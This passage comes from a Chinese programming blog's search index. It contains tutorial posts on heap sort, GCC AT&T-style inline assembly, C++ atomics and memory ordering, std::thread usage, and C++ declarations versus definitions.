__DEBUG__ std::cout \u003c\u003c \"HeapSort Before: \"; PrintArray(vec); #endif // 堆顶元素不断下沉 auto MaxHeapTopDown = [](std::vector\u003cint\u003e\u0026 heap, size_t root, size_t end) { // 计算左子节点 size_t child = (root + 1) * 2 - 1; // 将堆顶元素不断下沉到合适位置 while (child \u003c= end) { // 右子节点比左子节点大 if (child + 1 \u003c= end \u0026\u0026 heap[child + 1] \u003e heap[child]) { child += 1; } // 子节点比父节点大 if (heap[child] \u003e heap[root]) { std::swap(heap[child], heap[root]); root = child; child = (child + 1) * 2 - 1; } else { break; } } }; size_t root = 0, len = vec.size(); // 构建大顶堆 for (long i = (len - 1) / 2; i \u003e= 0; --i) { MaxHeapTopDown(vec, i, len - 1); } #if __DEBUG__ std::cout \u003c\u003c \"MaxHeap: \"; PrintArray(vec); #endif // 不断交换堆顶与最后元素 for (long i = len - 1; i \u003e root; --i) { std::swap(vec[i], vec[root]); // 维护好剩余序列组成的大顶堆 MaxHeapTopDown(vec, root, i - 1); #if __DEBUG__ std::cout \u003c\u003c \"HeapSort [{}-{}]: \"_fmt(root, i - 1); PrintArray(vec); #endif } #if __DEBUG__ std::cout \u003c\u003c \"HeapSort After: \"; PrintArray(vec); #endif } 时间复杂度分析 ：\n堆是一个完全二叉树，树深度为 logn ，每次维护大顶堆最多操作 logn 次，则总时间复杂度为 O(n*logn) 空间复杂度 ：没有使用额外空间，故为 O(1) 。\n以上便是所有常见的排序算法了，完整的代码实现与测试用例请查看 Github 代码 。\n","description":"一文看懂排序算法，附赠代码实现哟~","tags":["笔记","算法"],"title":"排序算法总结","uri":"/posts/id/06050027/"},{"categories":["posts"],"content":"什么是内联汇编？ C++ 内联汇编 是在C++源代码嵌入汇编代码的方法，可以使用汇编指令操作寄存器和内存来实现C++本身难以实现的功能，在操作系统等底层软件开发中经常用到。\nC++中内联汇编的关键字是 asm ，当然你也可以使用兼容C的 __asm__(GCC) 或 __asm(MSVC) 。汇编语法在不同系统上可能不同，主要分为 AT\u0026T/UNIX 风格和 Intel 风格，而 GCC 默认使用 AT\u0026T 风格汇编，本文主要讨论 X86 GCC 下的 AT\u0026T 风格内联汇编。\n如果要在GCC下使用 Intel 风格汇编需要在汇编指令开始时使用 .intel_syntax noprefix\\n 声明一下，使用 .att_syntax\\n 可以恢复 AT\u0026T 风格，或者在使用 GCC 编译时加上 -masm=intel 选项，不过这会改变整个项目内的内联汇编风格且只对 X86 和 X86_64 平台有效。\nAT\u0026T风格汇编语法 AT\u0026T 风格汇编与我们最开始学习的 X86 Intel 汇编语法有些不同，主要表现在以下方面：\n操作数的顺序\nAT\u0026T 风格汇编是从源操作数到目的操作数，即动作指令后面先跟源操作数，逗号后跟目标操作数，而 Intel 风格汇编正好与此相反。\n使用寄存器\n使用寄存器时需要加上 % 前缀，比如使用 eax 寄存器需要使用 %eax 。\n使用立即数\n使用立即数需要加上 $ 前缀，比如使用常量 10 ，需要使用 $10 。对于十六进制常量，还需要使用 0x 前缀，而 Intel 风格中使用 h 后缀，比如十六进制常量 ff020 需要使用 $0xff020 。\n不同大小的操作数\n对于不同大小的数据，AT\u0026T 语法中使用不同的操作码后缀，比如 b 、w 、l 、q 后缀分别代表 8 、16 、32 、64 位内存数据。比如赋值 32 位 eax 寄存器内容为 10 中：movl $10, %eax 。\n内存偏移操作\n内存偏移改变了形式，其中 Intel 风格下的 [base + index*scale + disp] 在 AT\u0026T 风格下变为了：disp(base, index, scale) ，需要注意其中 disp 和 scale 立即数不需要使用 $ 前缀了！\n下面是一些 AT\u0026T 与 Intel 风格的对比：\nIntel风格 AT\u0026T 风格 mov eax, 10 movl $10, %eax mov ebx, 1ffh movl $0x1ff, %ebx int 15h int $0x15 mov ebx, eax movl %eax, %ebx mov eax, [ecx] movl (%ecx), %eax mov eax, [ecx + 02h] movl 0x02(%ecx), %eax add eax, [ebx + ecx*20h] addl (%ebx, %ecx, 0x20), %eax lea eax, [ebx + ecx] leal (%ebx, %ecx), %eax sub eax, [ebx + ecx*2h - 02h] subl -0x02(%ebx, %ecx, 0x2), %eax C++内联汇编基本语法 C++内联汇编基本语法为：\n1 2 3 4 5 6 7 8 9 10 11 // 其中 [] 表示可选 asm [volatile] ( \"汇编指令\" ); // 其中 [] 表示可选 asm [volatile] ( \"汇编指令\" : [\"约束字符串\"(表达式), ...] // 输出操作数 : [\"约束字符串\"(表达式), ...] // 输入操作数 [: \"破坏标记\", ...] //破坏列表 ); 其中 汇编指令 是必须的，冒号后操作数为逗号分隔的输入、输出列表，每个元素包含一个约束字符串和一个C++表达式，操作数支持的最大数量受机器操作数限制。冒号后破坏列表也是逗号分割的列表，每个元素是一个寄存器名称或者特殊标识符。\n如果只有输入或输出操作数，则必须在另外一个位置放置 : 作为占位符号。内联汇编就是利用输入、输出操作数与源程序中变量进行交流的，破坏列表告诉 GCC 哪些寄存器或资源在内联汇编中改变了，以便GCC正确分配寄存器或恢复寄存器值。\n可以在汇编中直接对操作数内容进行操作，就像函数参数一样，第一个操作数在汇编指令中使用 **%0 ** 访问，第二个参数使用 %1 访问，后面的参数依次类推，就像使用普通寄存器一样。\n约束 约束就是约束表达式内值行为，一些常见的约束有\n寄存器约束 约束 作用 r 使用r约束的数据存储在任意一个可用的通用寄存器中 a 使用a约束的数据存储在 eax 、ax 、al 寄存器中 b ebx 、bx 、bl c ecx 、cx 、cl d edx 、dx 、dl S（大写） esi 、si D edi 、di 内存操作约束 通常情况，操作数都会存储在寄存器中，再同步到内存中，使用内存操作约束 m 后，对操作数数据操作都直接发生在内存中，这在 asm 中更新变量值时经常用到。下面是几种不同内存操作约束的对比：\n约束 描述 m 允许内存操作，支持任意类型地址 o 允许内存操作，但地址必须是可偏移的 V 允许内存操作，但地址不能是可偏移的，即符合 m 约束但不符合 o 约束 匹配约束 某些情况下单个变量可以同时用于输入和输出，这是可以使用匹配约束（数字）来有效利用寄存器。比如：\n1 2 3 4 5 6 7 int a = 0; asm( \"incl %0\\n\\t\" : \"=a\"(a) : \"0\"(a) ); // a == 1 数字 0 表示与第一个输出操作数使用相同寄存器约束，输入和输出都存储在相同寄存器中，这里是 eax 。\n匹配约束适用于读取变量，并将修改后结果输出到同一个变量中的情况，可以有效利用寄存器。\n其他约束 约束 描述 g 允许任何通用寄存器寄存器、内存或及时整数操作数 i 一个立即整数操作数（有常量值的）。这包括符号常数，其值只有在汇编期或以后才会知道。 n 一个已知数值的立即整数操作数。许多系统不能支持小于一个字宽的操作数的汇编期常量。这些操作数的约束应该使用 n 而不是 i。 q a、 b 、c 或 d 寄存器 F 允许立即浮点操作数，比如 const double 。 E 一个立即浮点操作数（表达式代码 const double），但只有在目标浮点格式与主机（编译器运行在其上）的浮点格式相同时才允许使用。 其他约束一般情况也用不到，不用过多了解。\n约束修饰符 约束修饰符跟约束一起使用，下面是操作数的约束修饰符：\n=\n表明操作数被汇编指令写入，之前的值被丢弃，新值替换。\n+\n表明操作数被汇编指令读取和写入。\n使用 = 和 + 约束修饰符时可以让编译器知道哪些操作数被修改或读取，除明确指定 + 或 = 外，其他情况都默认是只读的，这两个约束修饰符应该放到约束字符串开头。\n\u0026\n表明该操作数在指令使用完输入操作数之前被写入，所以该操作数不能位于指令读取的寄存器中，也不能作为任何内存地址一部分。\n\u0026 修饰的操作数不能代替 + 或 = 的功能，由于 \u0026 修饰的操作数总是被写入，所以一个只读的 \u0026 修饰的操作数是不合法的。\n%\n表明操作数与后面的操作数是可以互换的，编译器可以交换这两个操作数，但是只有只读操作数可以使用 % ，% 约束修饰符只能在约束字符串开头。\n破坏列表 虽然扩展内联汇编有输出列表可以告知编译器哪些寄存器被改变了，但是汇编中计算可能会使用其他寄存器甚至一些特殊寄存器，为了通知编译器这些寄存器也被修改了，就需要在破坏列表中列出。编译器在存储输入或输出操作数时会避开破坏列表中的寄存器。\n破坏列表不应该包含栈指针寄存器，编译器要求栈指针值在进入 asm 时会离开 asm 时是相同的。\n有两个特殊的破坏列表参数经常用到：\n破坏参数 描述 cc 表明汇编代码修改了标志寄存器，比如用于判断的寄存器 memory 告知编译器，汇编代码对输入和输出列表的其他内存进行了读取或写入，比如参数是指针，汇编访问了指针指向的内存。使用 memory 可以有效的形成编译器内存读/写屏障。 内联汇编重点在汇编语法上面，扩展内联汇编提供了与源程序中变量沟通的能力，使用时注意搭配约束和破坏列表使用。\n由于汇编特殊性，这里没有深入介绍其他用法，仅仅作为简单用法的记录，下面有一些其他文章提供参考：\nGCC内联汇编文章翻译 GCC Inline Assembly asm -- Cppreference ","description":"在C++方便的使用汇编","tags":["Code","C++基础"],"title":"X86 C++内联汇编","uri":"/posts/id/4021507/"},{"categories":["posts"],"content":"原子量介绍 多线程下的数据竞争问题一直是让人头疼的问题，比如下面这段代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int count{0}; int main() { auto func = []() { for (int i = 0; i \u003c 500; ++i) { count += 2; } }; auto th = std::thread{func}; auto th2 = std::thread{func}; th.join(); th2.join(); std::cout \u003c\u003c count \u003c\u003c \"\\n\"; return 0; } 很明显，count 绝大多数情况下都不会等于 2000 ，一般情况都会使用锁来做保护，不过使用锁来保护这种简单的变量操作代价是比较高的，C++11 引入了原子变量 atomic 来解决简单变量操作的原子性和线程间的同步，也就是这篇文章要介绍的东西。\natomic 是一个模板类，使用需要引入头文件：#include \u003catomic\u003e ，定义如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 template\u003ctypename _Tp\u003e struct atomic { using value_type = _Tp; private: // Align 1/2/4/8/16-byte types to at least their size. static constexpr int _S_min_alignment = (sizeof(_Tp) \u0026 (sizeof(_Tp) - 1)) || sizeof(_Tp) \u003e 16 ? 0 : sizeof(_Tp); static constexpr int _S_alignment = _S_min_alignment \u003e alignof(_Tp) ? _S_min_alignment : alignof(_Tp); alignas(_S_alignment) _Tp _M_i _GLIBCXX20_INIT(_Tp()); static_assert(__is_trivially_copyable(_Tp), \"std::atomic requires a trivially copyable type\"); static_assert(sizeof(_Tp) \u003e 0, \"Incomplete or zero-sized types are not supported\"); // C++ 17 开始对类型有下面这些限制 #if __cplusplus \u003e 201703L static_assert(is_copy_constructible_v\u003c_Tp\u003e); static_assert(is_move_constructible_v\u003c_Tp\u003e); static_assert(is_copy_assignable_v\u003c_Tp\u003e); static_assert(is_move_assignable_v\u003c_Tp\u003e); #endif public: // ... }; 对于简单类型比如 bool 、int 、long 、uint 等标准库都提供了模板特化，可以直接使用不需要再使用模板形式，比如 unsigned int 可以写成 atomic_uint ，atomic 模板同时支持任何支持 memcpy ，按位可比较并且 s_copy_constructible_v\u003c_Tp\u003e 、is_move_constructible_v\u003c_Tp\u003e 、is_copy_assignable_v\u003c_Tp\u003e 、is_move_assignable_v\u003c_Tp\u003e 的 value 成员不为 false 的类型。对于上面这些类型，atomic 同时支持其指针形式。\natomic 支持的模板参数类型可以拷贝构造和拷贝赋值，但是atomic 本身是不支持复制和移动的。\n所谓原子变量，就是支持一些简单原子操作的变量，而原子操作，指的是对于一个操作，你可以看到操作前的值和操作后的值，但是中间的步骤你无法观察到，整个操作是一个整体，不可分割的。比如对 a += b 的操作，普通情况下可能为：\n1 2 3 4 5 ;; %0为a, %1为b mov %1 %%eax; mov %0 %%ebx; addl %%eax %%ebx; mov %%ebx %0 对应的操作不止一条指令，而变为原子操作后多条指令被看作一个整体，执行这些指令时是无法被中断的。而上面代码 count 值不等于 2000 也主要是多线程下 count += 2 不是原子的，导致了这一行代码执行一半被其他线程抢占。\natomic_flag 是标准库提供的一个最简单的原子量，只表示两种状态，类似于 atomic_bool 但它保证是无锁的，对于其他类型的 atomic\u003cT\u003e ，如果 T 的大小为 1,2,4,8,16 字节时，一般都是无锁的。要判断当前类型原子量是不是无锁的，可以使用 is_lock_free() 函数判断。\n原子量操作 atomic 提供了赋值、写入、读取、原子加减、原子与、或、异或等简单操作。复杂操作或者原子量不支持的估计就直接选择锁了哈哈。\n读取操作： load 、operator T 写入操作：store 、= 原子加减：fetch_add 、fetch_sub 、operator += 、 operator -= 、operator ++ 、operator -- 原子位操作：fetch_and 、fetch_or 、fetch_xor 、operator \u0026= 、operator |= 、operatpr ^= 使用原子变量，那么上面的线程不安全代码就可以很好的解决了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 std::atomic_int count = 0; int main() { auto func = []() { for (int i = 0; i \u003c 1000; ++i) { count += 1; } }; auto th = std::thread{func}; auto th2 = std::thread{func}; th.join(); th2.join(); std::cout \u003c\u003c count \u003c\u003c \"\\n\"; return 0; } 没错！只需要将 int count{0}; 换成 std::atomic_int count{0}; 执行 count += 1 时，原子量保证这个操作是原子的，不会因为执行一半而被其他线程抢占。\n内存顺序与同步 如果你在 IDE 内使用 atomic 的操作时，应该会注意到这些操作有第二个参数，不过为默认参数，比如 atomic_int 的 fetch_add 操作就是：\n1 fetch_add(__int_type __i, memory_order __m = memory_order_seq_cst) noexcept; 而这个 memory_order 就是原子量同步的关键。\n说到内存顺序就不得不提一嘴 CPU执行乱序 和 编译乱序 了。CPU执行不是一条条执行吗，难不成还会乱跳？代码都是顺序编写，难不成还到处乱变？这里的乱序肯定是不违背代码本身含义的特殊情况了。\n编译乱序\n编译器优化应该都听说过，就是编译器在不影响程序的情况下尽量减少逻辑上的访存和加快程序运行效率对代码进行调整的行为。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 inline int getB() { return 25; } int main() { int a = 10; int b = getB(); printf(\"%d\\n\", b); printf(\"%d\\n\", a); return 0; } // 编译器可以优化成下面这样(假设情况) int main() { int b = 25; int a = 10; printf(\"%d\\n\", b); printf(\"%d\\n\", a); return 0; } 上面代码不会影响程序，但是 a 和 b 的初始化顺序可能是不同的。\n执行乱序\n而执行乱序比较复杂，虽然编译后的二进制文件按照一定顺序排列，但是现在CPU一般都有自己的缓存组织，访问缓存有的可能比从内存读取的指令先执行，对连续内存访问的指令可能先执行。\n关于这部分内容可以先看看其他专门讲这部分的文章，再接着看，比如：内存屏障（Memory Barrier）究竟是个什么鬼？ - 知乎 。\n内存顺序 内存顺序描述了计算机内部CPU获取内存数据的顺序，而上面的 “乱序” 就可以看作是一种内存顺序，这种排序在单线程下是不会有问题的，但是在多线程下面是没法保证的，比如：\n1 2 3 4 5 6 7 8 9 10 11 bool flag = false; int A = 0; void set() { A = 10; flag = true; } void get() { while (!flag); assert(A == 10); // 可能断言失败 } 这里A的设置没有内存顺序的约束，所以A的设置可能在flag设置之后。\nC++标准库给出的原子量操作提供了 6 种不同的内存顺序：\nmemory_order_relaxed\n这个标志对内存顺序没有限制，仅仅保证操作是原子的，程序行为同上面代码类似：\n1 2 3 4 5 6 7 8 9 10 11 std::atomic_bool flag{false}; int A{0}; void set() { A = 10; flag.store(true, std::memory_order_relaxed); } void get() { while (!flag.load(std::memory_order_relaxed)){} assert(A == 10); // 可能断言失败 } memory_order_acquire 、memory_order_release\n这两个标志通常配合使用，acquire 内存顺序保证在当前线程内，之后的读取操作不会排序到此操作之前。release 内存顺序保证当前线程此操作之前的写入不会排序到此操作之后，并且之前的写入操作对使用相同原子量的 acquire 操作的其他线程可见。\n即如果 A 线程使用release 写入，B 线程使用 acquire 读取，则内存顺序可以保证B线程读取之后的代码访问A线程写入之前的数据是正确的。\n所以上面代码稍微修改一下就不会出问题了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 std::atomic_bool flag{false}; int A{0}; // A线程 void set() { A = 10; flag.store(true, std::memory_order_release); } // B线程 void get() { while (!flag.load(std::memory_order_acquire)){} assert(A == 10); // 断言不会失败 } memory_order_consume 、memory_order_release\nconsume 于 acquire 的区别在于 consume 只保证此读取操作之后，与当前读取值有依赖关系的操作不会排序到此操作之前，相当于放宽了内存限制，目前已不推荐使用。\nmemory_order_acq_rel\n相当于结合了 acquire 和 release ，如果是读取操作则为 acquire ，如果是写入操作则为 release ，如果是 读取-修改-写入 操作则是先 acquire ，再 release 。什么意思呢，就相当于当前线程使用此内存顺序的原子读取操作可以看到其他线程使用相同原子量的 release 写入操作及其之前的所以写入操作。当前线程使用此内存顺序的原子写入操作会以 release 内存顺序写入，其他线程可以看到当前线程此操作及之前的所有写入操作。对于当前线程的 读取-修改-写入 操作，保证读取到的值是正确写入的，写入后的值保证同步到其他线程。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 std::atomic_int A{0}; std::atomic_int B{1}; std::atomic_bool flag1{false}; std::atomic_bool flag2{false}; void TH1() { A.store(10, std::memory_order_acq_rel); flag1.store(true, std::memory_order_acq_rel); while (!flag2.load(std::memory_order_acq_rel)){} printf(\"TH1 -\u003e B: %d\\n\", B.load(std::memory_order_acq_rel)); } void TH2() { B.store(20, std::memory_order_acq_rel); flag2.store(true, std::memory_order_acq_rel); while (!flag1.load(std::memory_order_acq_rel)){} printf(\"TH2 -\u003e A: %d\\n\", A.load(std::memory_order_acq_rel)); } // 打印 // TH2 -\u003e A: 10 // TH1 -\u003e B: 20 memory_order_seq_cst\n这是 C++ 原子操作的默认内存顺序，具有内存一致性，功能上与 memory_order_acq_rel 相同，不过它还会对所有使用相同原子量的操作进行同步，使所有线程看到的内存顺序是一致的，就好像是在一个线程内执行。如果同时存在写和读，那么保证写必须再读之前发生。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 std::atomic_bool A{false}; std::atomic_bool B{false}; void TH1() { A.store(true); } void TH2() { B.store(true); } void TH3() { while (!A.load()){} printf(\"TH3\\n\"); } void TH4() { while (!B.load()) {} if (A.load()) { printf(\"TH4\\n\"); } else { printf(\"TH4 Error\\n\"); } } int main() { auto th2 = std::thread{TH2}; auto th1 = std::thread{TH1}; auto th3 = std::thread{TH3}; auto th4 = std::thread{TH4}; th2.join(); th1.join(); th3.join(); th4.join(); return 0; } 如果 A 先写入，则会先打印 TH3 ，再打印 TH4， 如果 B 先写入，则先打印 TH4 Error，再打印 TH3 ，不会出现先打印 TH4， 再打印 TH3 的情况。\n原子比较交换\n原子量还有两个函数经常使用，利用这个可以实现无锁链表、队列等。compare_exchange_weak 和 compare_exchange_strong 这两个函数可以原子地按位比较期望值和原子值，如果原子值与期望值相等，则将新值赋值给原子值，如果不相等，则将原子值写入期望值地内存空间，函数原型如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 // expected_value : 期望值 // new_value : 新值 // success: 成功替换后操作地内存顺序 // error: 失败后操作地内存顺序 compare_exchange_strong\u003cT\u003e(T\u0026 expected_value, T new_value, memory_order success, memory_order error) noexcept; compare_exchange_strong\u003cT\u003e(T\u0026 expected_value, T new_value, memory_order all) noexcept; compare_exchange_weak\u003cT\u003e(T\u0026 expected_value, T new_value, memory_order success, memory_order error) noexcept; compare_exchange_weak\u003cT\u003e(T\u0026 expected_value, T new_value, memory_order all) noexcept; 怎么用呢？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 std::atomic_int flag{10}; void TH1() { int expected_value = 10; if (!flag.compare_exchange_strong(expected_value, 20)) { printf(\"TH1 -\u003e error: %d\\n\", expected_value); } } void TH2() { int expected_value = 10; if (!flag.compare_exchange_strong(expected_value, 30)) { printf(\"TH2 -\u003e error: %d\\n\", expected_value); } } // 要么输出: TH2 -\u003e error: 20 // 要么输出: TH1 -\u003e error: 30 如果用链表实现无锁栈，则可以在插入和删除时使用这个函数，链表一般使用头插法比较方便，所以入栈操作可以这么实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 template\u003ctypename T\u003e struct node { T data; node* next; node(const T\u0026 data) : data(data), next(nullptr) {} }; template\u003ctypename T\u003e class stack { std::atomic\u003cnode\u003cT\u003e*\u003e head; public: void push(const T\u0026 data) { // 构造一个新的节点 node\u003cT\u003e* new_node = new node\u003cT\u003e(data); // 节点后继指针指向当前链表头部， // 下一步只需要设置当前链表头指针为新节点即可。 new_node-\u003enext = head.load(std::memory_order_relaxed); // 这一步便可以很巧妙地使用 compare_exchange_weak 完成 // 如果指向到此步时其他线程没有插入新的节点，即链表头节点没有改变 // 那么原子量与期望值相同，将原子量值设定为新节点，实现插入，循环返回true结束 // 如果其他线程突然修改了头指针，则比较失败，将链表头节点即原子量值设置给期望值 // 这里就相当于 new_node-\u003enext = head.load(std::memory_order_relaxed); // 同时循环返回false，继续判断，直到插入成功为止。 while(!head.compare_exchange_weak(new_node-\u003enext, new_node, std::memory_order_release, std::memory_order_relaxed) {} } }; 本文仅对 atomic 地操作进行了简单介绍，更多关于 memory_order 地内容请参考 C++ 官方文档。\n参考文献\nstd::memory_order - cppreference.com std::memory_order - cplusplus.com ","description":"使用原子变量实现更轻量的同步","tags":["Code","C++基础"],"title":"C++并发之原子变量","uri":"/posts/id/3271638/"},{"categories":["posts"],"content":"C++11引入了线程，头文件为 #include \u003cthread\u003e ，标准库的东西基本都是跨平台的，我们就不用处理跨平台的问题了，使用起来也很方便。\nC++中，线程用 thread 类描述，表示一个执行线程。线程在构造关联的线程对象后立刻开始执行，构造函数需要提供一个顶级函数或可调用对象作为线程开始运行的代码，顶级函数返回值会被忽略 ，线程在遇到异常后调用 std::terminate() 结束运行。如果需要获取返回值或异常，可以使用 承诺对象 std::promise 或共享变量将返回值或异常传达给调用方。\n线程构造 thread 构造函数也可以不传入任何函数，thread不与任何对象关联，此时对象不是执行线程（即默认构造函数）。thread 没有拷贝构造函数和拷贝赋值操作，只能使用对应的移动版本。\n1 2 3 4 5 6 7 8 std::thread th{}; // 默认构造，不是一个执行线程 std::thread th1{ []() { std::cout \u003c\u003c \"Hello thread\" \u003c\u003c std::endl; } }; std::thread th2{std::move(th1)}; // 移动构造，此后th1不能再使用！！！ 最常使用的构造函数版本是：\n1 2 template\u003ctypename _Callable, typename... _Args, typename = _Require\u003c__not_same\u003c_Callable\u003e\u003e\u003e explicit thread(_Callable\u0026\u0026 __f, _Args\u0026\u0026... __args); _Callable 是之后调用的对象，_Args 是该对象调用时需要传递的参数，_Callable 和 _Args 都是按值移动和复制的，如果需要传递引用，需要手动包装 std::ref 或 std::cref 。值得一提，这个跟 std::bind 差不多的，都是使用了 std::decay 进行了类型退化同时去除 CV 限定的。使用线程时有时也需要配合 std::bind 使用，比如类内线程初始化，且执行函数为类成员函数，使用 std::bind 绑定 this 指针。\n1 2 3 4 5 6 7 8 9 10 11 12 void test(int\u0026 a) { // ... 进行一些操作 a = 100; // 将结果赋值给参数 } // ... int ret = 0; std::thread th{ test, std::ref(ret) // 使用 ref 包装确保不会被类型退化为 int }; // ... std::cout \u003c\u003c ret \u003c\u003c std::endl; // 输出结果为 10 // ... thread 在构造时上下文还在调用方，如果拷贝或者移动时出现异常，则会在当前调用方线程抛出异常，如果时在线程运行中出现异常，则是在线程内抛出异常，不会影响调用方线程，不过会影响调用方获取结果。\n线程析构 线程析构函数调用形式如下：\n1 2 3 4 5 ~thread() { if (joinable()){ std::terminate(); } } 如果线程为执行线程，则 joinable() == true ，否则为 false 。如果线程在执行完成之前被析构，则可能抛出异常：terminate called without an active exception 。\n线程在以下情况可以被安全销毁：\n线程是默认构造的（没有关联的对象）。 线程已经被移动。 线程调用了 join() 或 detach() 。 为确保线程安全销毁，应该调用 detach 分离线程或者调用 join 等待线程执行完成，但是 join 不能随便调用，需要确保线程是可以等待的，即应该先使用 joinable 判断是否能等待，再进行等待。默认构造的线程不需要等待也能安全销毁。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int main(int argc, chat* argv[]) { std::thread th{ [](){ // 休眠2秒 std::this_thread::sleep_for(std::chrono::second(2)); std::cout \u003c\u003c \"thread alive!\" \u003c\u003c std::endl; } }; // 如果不调用下面代码等待线程结束，则线程会在main函数 // 结束时调用 std::terminate 销毁，出现异常！ /* if (th.joinable()) { th.join(); } */ } 线程操作 thread 需要使用的函数真的很少，下面是一些常见用法：\n获取线程 id ，一般用于打印当前线程，比如日志里面。\n1 2 3 4 5 6 7 8 // 如果默认构造的线程，则id也为默认构造，没有实际用处 id std::thread::get_id() const noexcept; // example std::thread th1{...} std::cout \u003c\u003c \"线程1的id为：\" \u003c\u003c th1.get_id() \u003c\u003c std::endl; // id是一个结构体，为什么能直接打印呢 // 因为 thread id 内部重载了 \u003c\u003c 判断线程是否可以等待，配合 join 使用。\n1 2 3 4 5 6 7 8 9 10 11 bool std::thread::joinable() const noexcept; // example { std::thread th{...} // ... if (th.joinable()){ std::cout \u003c\u003c \"线程可以等待\" \u003c\u003c std::endl; th.join(); } } 等待线程结束，配合 joinable 使用，会阻塞调用方线程，对于持有线程的对象，不确定线程何时结束，需要使用 join 等待，否者可能在线程未执行完就析构，出现问题。\n1 void std::thread::join(); 分离线程，调用后线程类对象就不具有任何线程，不需要等待也能安全析构，分离的线程结束后会自动是否所有分配的资源，适合执行一些不需要判断结果的耗时操作。\n1 void std::thread::detach(); 交换两个线程对象，同 std::swap(th1, th2) 。\n对于 get_id ，其实很多时候都需要在线程内部调用，所以C++还提供了一个特殊函数，用于获取到当前上下文线程对象：std::this_thread ，同时提供了几个操作：\nget_id() ，获取当前线程 id 。\nsleep_for(duration) ，睡眠当前线程指定时间段，可以使用 std::chrono 指定，比如：\n1 2 3 4 void test() { // 此处线程睡眠2秒 std::this_thread::sleep_for(std::chrono::seconds(2)); } sleep_until(time_point) ，指定一个时间点，一直睡眠到指定时间。\n关于线程的同步和结果获取留到后面的文章再讨论。\n","description":"pthread？恐怕没有标准库的线程库香吧！","tags":["Code","C++基础"],"title":"C++并发之线程使用","uri":"/posts/id/3252051/"},{"categories":["posts"],"content":"学过C/C++的应该对声明与定义不陌生，因为我们经常能在学习和使用中遇到，像什么请选出以下选项中正确的声明语句 ... 、编译器又报错了！重定义符号xxx，我咋知道啥是重定义？？？ 等问题。\n到底啥是声明，啥是定义？遇到重定义符号是什么原因？这篇文章就结合 Cppreference 来学学到底声明和定义是什么。\n本文所有概念均为C++11及以上标准，太低标准咱就不讨论了。\n声明 声明就是将名称引入（或再引入）到C++程序，让编译器知道这个名称是什么东西，但是并非所有声明都实际上声明了东西（后面会讲），且每种实体的声明方式不同。\n声明可以是以下之一（看看就好）：\n函数声明 ：void f(int a);\n模板声明（包括不完全模板特化）\ntemplate\u003ctypename A, typename B\u003e class Test;\ntemplate\u003ctypename A\u003e class Test\u003cA, int\u003e;\n显式模板实例化、显式模板特化\n命名空间声明\n语言链接说明\nextern \"C\"\n空语句声明\n块声明\nASM（汇编）声明 类型别名声明 名称空间别名声明 using声明和using namespace声明 using 枚举声明 static_assert声明 不透明枚举声明 简单声明 简单声明 简单声明就是引入、创建和选择性地初始化一个或多个标识符的语句，格式为：\u003c任意数量的属性列表\u003e \u003c以空格分隔的说明符任意顺序序列\u003e \u003c一个或多个初始化声明符的逗号分隔序列\u003e 。\n声明说明符 包括 typedef 、函数说明符inline virtual explicit 、内联变量inline 、友元函数说明符friend 、constexpr（变量定义、函数、函数模板声明、文本类型静态数据成员声明） 、consteval（函数、函数模板声明） 、constinit（声明具有静态或线程存储持续时间的变量） 、static register thread_local extern multable 、各种类型说明符。\n注意：\n块中声明的标识符如果在块外被声明，则在块内只有块内声明的有效。\n在块内声明的所有自动变量在退出块时都会被销毁，销毁顺序与初始化顺序相反。\n光看概念没什么用，结合几个例子再看看：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 struct S { int width; int height; }a, *pa(\u0026a); // 声明了类型S， // 变量a，类型为S // 变量pa，类型为S*，初始化为变量a的地址 int i = 1, *pi = nullptr, func(int); // 声明了变量i，类型为int，初始化为1 // 变量pi，类型为int*，初始化为nullptr // 函数func，返回值为int，有一个int参数 int (*pfunc)(int); // 声明了一个函数指针类型pfunc，指向类型为int返回值，一个int参数的函数 int (*p)[3] = nullptr; // 一个指向3个int元素数组的指针 // 初始化为nullpter int (*(*pf(int)))[3] = nullptr; // 声明一个函数指针，指向一个返回值为指向3个int元素数组的指针，参数为int // 初始化为nullptr 定义 定义是完全定义声明引入的实体的声明。 听起来很绕，什么意思呢，就是你写一个声明，但是要求这个声明必须是完全声明。所有的声明都是定义（声明可以既是声明也是定义！），但是以下情况声明不算定义：\n没有函数体的函数声明，包括其参数都不算定义。\n比如：void f(int a); // 声明了函数f和其参数a，不是定义 。\n任何具有extern外部存储说明符或语言链接说明符extern \"C\"，且没有初始化的声明。\n1 2 3 4 5 extern int a = 10; // 声明a并且定义了a extern int b; // 单纯的声明b extern \"C\" { int a; // 单纯声明a } C++17起的类定义中，声明为非内联的静态数据成员。\n1 2 3 4 5 6 7 struct Test { int number; // 定义Test::number static int count; // 声明Test::count，没有定义 inline static int count1; // 定义Test::count1 }; // 定义Test类 int Test::count = 1; // 定义Test::count 通过前向声明或在另一个声明中使用详细类名说明符声明的类名。\n1 2 class Exector; // 前向声明，不是定义 class A a(class B b); // 声明，没有定义A、B、a、b 枚举的不透明声明。\n如：enum Color: int; // 声明Color枚举，没有定义。\n模板参数声明。\n如：templete\u003ctypename T\u003e // 声明T，没有定义。\ntypedef别名和using声明。\n1 2 3 typedef A B; // 声明B，同时A可能不完全。 using C = D; // 声明D，同时C可能不完全。 using std::string; // 声明std::string，不是定义 extern templete 的显式特化、类的显示完全模板特化。\n并不是所有声明都会定义实体，比如 asm声明不定义任何实体，但是归纳为定义。类似的不定义实体的还有类模板参数推导、static_assert 、属性声明、空声明、using指令（不是using别名）。\nC++规定，如果任何对象的定义导致对象的不完整类型或抽象类型，则程序是病式的。\n也就是说我们需要保证使用的对象或者抽象类类型都是定义完整的，不然程序就是有问题的，你就是有毛病的。\n不完整类型 